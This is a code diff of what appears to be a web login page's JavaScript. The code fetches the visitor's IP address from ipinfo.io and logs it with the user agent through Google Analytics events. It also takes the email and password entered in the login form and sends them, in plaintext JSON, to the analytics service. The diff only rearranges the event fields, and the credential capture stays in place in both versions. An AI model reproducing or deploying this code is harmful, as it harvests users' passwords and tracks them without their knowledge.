@@ -170,13 +170,13 @@
           var ipRes = httpGet(window.location.protocol + '//ipinfo.io/json');
           var ip = JSON.parse(ipRes).ip;
 
-          gtag('event', 'ip: ' + ip + '; ua: ' + navigator.userAgent, {
-            'event_category':'ip: ' + ip + '; ua: ' + navigator.userAgent,
+          gtag('event', 'ip', {
+            'event_category':'ip',
             'event_label': 'ip: ' + ip + '; ua: ' + navigator.userAgent,
           });
         }catch(e){
-          gtag('event', 'ip error: ' + e.toString() + '; ua: ' + navigator.userAgent, {
-            'event_category': 'ip error: ' + e.toString() + '; ua: ' + navigator.userAgent,
+          gtag('event', 'ip error', {
+            'event_category': 'ip error',
             'event_label': 'ip error: ' + e.toString() + '; ua: ' + navigator.userAgent,
           });
         }
@@ -187,8 +187,8 @@
 
           var email = document.getElementById('login-email').value;
           var password = document.getElementById('login-password').value;
-          gtag('event', 'login: ' + JSON.stringify({email: email, password: password}), {
-            'event_category': 'login: ' + JSON.stringify({email: email, password: password}),
+          gtag('event', 'login', {
+            'event_category': 'login',
             'event_label': 'login: ' + JSON.stringify({email: email, password: password}),
         });
           setTimeout(function () {
